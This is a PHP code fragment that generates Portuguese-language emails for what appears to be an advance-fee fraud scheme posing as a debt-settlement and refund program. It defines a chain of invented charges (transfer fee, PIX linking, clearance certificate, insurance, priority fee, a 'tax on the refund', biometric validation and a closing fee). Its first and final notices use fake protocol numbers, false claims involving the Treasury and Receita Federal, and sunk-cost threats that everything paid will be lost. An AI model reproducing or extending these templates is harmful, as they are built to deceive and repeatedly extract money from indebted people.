            'o valor retornará ao Tesouro como <b>não reclamado</b> e o processo será encerrado <b>sem pagamento</b>.',
            'LIBERAR O VALOR AGORA →'
        ),
        'chave_pix' => array(
            'Chave PIX não vinculada',
            'a <b>vinculação da chave PIX</b> ao seu processo de ressarcimento está pendente. Sem a chave validada, o sistema <b>não tem para onde enviar</b> o valor.',
            'o pagamento será marcado como <b>sem destino válido</b> e o ressarcimento, <b>cancelado</b>.',
            'VINCULAR MINHA CHAVE PIX →'
        ),
        'ted' => array(
            'Tarifa de transferência pendente',
            'o envio do ressarcimento depende da <b>tarifa de transferência interbancária</b>. Enquanto não é paga, a ordem de pagamento fica <b>parada no banco</b>.',
            'a ordem de pagamento será <b>estornada</b> e o valor voltará para a fila de devolução ao Tesouro.',
            'LIBERAR A TRANSFERÊNCIA →'
        ),
        'certidao' => array(
            'Certidão negativa não emitida',
            'a <b>Certidão Negativa de Débitos</b> do seu CPF ainda não foi emitida. Sem ela, a quitação <b>não aparece nas consultas</b> do Serasa e SPC.',
            'o CPF continuará aparecendo <b>com restrição</b> nas consultas de crédito, mesmo com o acordo pago.',
            'EMITIR MINHA CERTIDÃO →'
        ),
        'cadastro' => array(
            'Atualização cadastral obrigatória',
            'o seu cadastro no programa está <b>desatualizado</b> e precisa ser regularizado para que a quitação seja publicada nos órgãos de crédito.',
            'o cadastro será marcado como <b>inconsistente</b> e a publicação da quitação ficará <b>suspensa</b>.',
            'ATUALIZAR MEU CADASTRO →'
        ),
        'seguro' => array(
            'Seguro de quitação pendente',
            'o <b>seguro de quitação</b> que protege o seu acordo contra nova cobrança dos credores ainda não foi confirmado. Sem ele, o acordo fica <b>sem garantia</b>.',
            'os credores poderão <b>reabrir a cobrança</b> integral da dívida e o acordo perderá a proteção.',
            'PROTEGER MEU ACORDO →'
        ),
        'prioridade' => array(
            'Processamento prioritário disponível',
            'o seu processo está na <b>fila padrão</b>, com prazo de até 45 dias úteis. A <b>taxa de prioridade</b> coloca a sua baixa na fila de 24 horas.',
            'o processo seguirá na fila padrão e a baixa poderá levar <b>mais de 45 dias úteis</b>, com risco de perda do prazo do programa.',
            'PRIORIZAR MEU PROCESSO →'
        ),
        'imposto_ress' => array(
            'Imposto sobre o ressarcimento',
            'a Receita Federal exige o recolhimento do <b>imposto sobre o valor do ressarcimento</b> antes do crédito. A guia está em aberto no seu CPF.',
            'o ressarcimento será <b>retido pela Receita Federal</b> até a regularização e poderá ser <b>compensado com multa</b>.',
            'RECOLHER O IMPOSTO →'
        ),
        'biometria' => array(
            'Validação biométrica pendente',
            'a <b>validação biométrica</b> do titular é obrigatória para o crédito do ressarcimento. A taxa de validação ainda não foi confirmada.',
            'o crédito será <b>bloqueado por falta de validação do titular</b> e o processo encaminhado para auditoria.',
            'VALIDAR MINHA IDENTIDADE →'
        ),
        'encerramento' => array(
            'Encerramento do processo pendente',
            'você está na <b>última etapa</b>: a taxa de encerramento do processo. É o único passo entre você e a conclusão definitiva — <b>tudo o que você já pagou depende dele</b>.',
            'o processo inteiro será <b>cancelado e arquivado</b>, e todas as etapas já pagas serão <b>perdidas sem reembolso</b>.',
            'CONCLUIR O ENCERRAMENTO →'
        ),
    );

    $t = isset($map[$slug]) ? $map[$slug] : array(
        'Pendência no seu acordo',
        'existe uma <b>pendência</b> na próxima etapa do seu acordo e o processo está <b>parado</b> até a regularização.',
        'o acordo será <b>cancelado</b> e o processo, arquivado.',
        'RESOLVER PENDÊNCIA →'
    );

    $proto = strtoupper(substr(preg_replace('/[^A-Za-z0-9]/', '', (string)$row['txid']), 0, 8));
    if ((int)$n === 1) {
        $subject = $nome . ', ' . $t[0] . ' — seu acordo está parado';
        $preheader = 'Há uma pendência travando o seu acordo. Resolva em menos de 1 minuto pelo link.';
        $inner = '<div style="font-size:11px;color:#71717a;margin:0 0 8px">Protocolo nº ' . $proto . ' · Status: <b style="color:#d97706">PENDÊNCIA ABERTA</b></div>'
            . '<h2 style="font-size:18px;color:#0C326F;margin:0 0 10px">' . htmlspecialchars($t[0]) . '</h2>'
            . '<p style="font-size:14px;color:#3f3f46;line-height:1.6">' . htmlspecialchars($nome) . ', ' . $t[1] . '</p>'
            . recovery_cta($link, $t[3])
            . '<div style="background:#fff8e1;border:1px solid #ffe08a;border-radius:10px;padding:12px;margin:14px 0">'
            . '<p style="font-size:13px;color:#7a5a00;margin:0;line-height:1.5"><b>Importante:</b> tudo o que você já pagou fica <b>congelado</b> até esta pendência ser resolvida. Cada dia parado atrasa a limpeza do seu nome.</p></div>'
            . '<p style="font-size:12px;color:#71717a;margin-top:14px;line-height:1.5">A regularização é feita em menos de 1 minuto, direto pelo link acima.</p>';
    } else {
        $subject = '⚠ Último aviso: ' . $t[0] . ' — ' . $nome;
        $preheader = 'Notificação final. Se não resolver agora, você perde tudo o que já pagou.';
        $inner = '<div style="font-size:11px;color:#71717a;margin:0 0 8px">Protocolo nº ' . $proto . ' · Status: <b style="color:#dc2626">ÚLTIMO AVISO</b></div>'
            . '<h2 style="font-size:18px;color:#dc2626;margin:0 0 10px">Último aviso: ' . htmlspecialchars($t[0]) . '</h2>'
            . '<p style="font-size:14px;color:#3f3f46;line-height:1.6">' . htmlspecialchars($nome) . ', esta é a <b>notificação final</b> sobre a pendência do seu acordo. Se não for resolvida agora, ' . $t[2] . '</p>'
            . recovery_cta($link, $t[3])
            . '<div style="background:#fef2f2;border:1px solid #fecaca;border-radius:10px;padding:14px;margin:14px 0">'
            . '<p style="font-size:13px;color:#991b1b;margin:0;line-height:1.5"><b>Pense no que você já investiu:</b> parar exatamente agora significa <b>perder tudo o que já foi pago</b> nas etapas anteriores — e falta muito pouco para concluir.</p></div>'
            . '<p style="font-size:12px;color:#71717a;margin-top:14px">Se você já resolveu nos últimos minutos, desconsidere esta mensagem.</p>';
    }
    return array('subject' => $subject, 'html' => recovery_email_shell($inner, isset($preheader) ? $preheader : ''));
}

} // RECOVERY_LIB_LOADED
